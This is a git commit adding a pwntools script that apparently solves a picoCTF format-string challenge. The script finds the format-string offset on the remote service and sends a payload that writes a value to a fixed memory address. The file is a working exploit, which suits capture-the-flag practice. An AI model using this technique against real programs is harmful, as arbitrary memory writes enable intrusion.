9a1c923d54888af1bc491d3fcbb645817bce985a
tousiftanzeeeem <2105071@ugrad.cse.buet.ac.bd>
2025-04-05 13:21:34 +0600

    Added Format String write script

---
+++ pwn/Format_String/format_string_write.py
@@ -0,0 +1,23 @@
+from pwn import *
+
+elf = context.binary = ELF('./vuln')
+context.log_level = 'critical'
+host = 'rhea.picoctf.net'
+port = 51098
+p = remote(host,port)
+
+def exec_fmt(payload):
+    io = remote(host,port)
+    io.sendline(payload)
+    return io.recvall()
+
+
+autofmt = FmtStr(exec_fmt)
+offset = autofmt.offset
+
+print(offset)
+
+payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
+
+p.sendline(payload)
+print(p.recvall().decode('latin-1'))
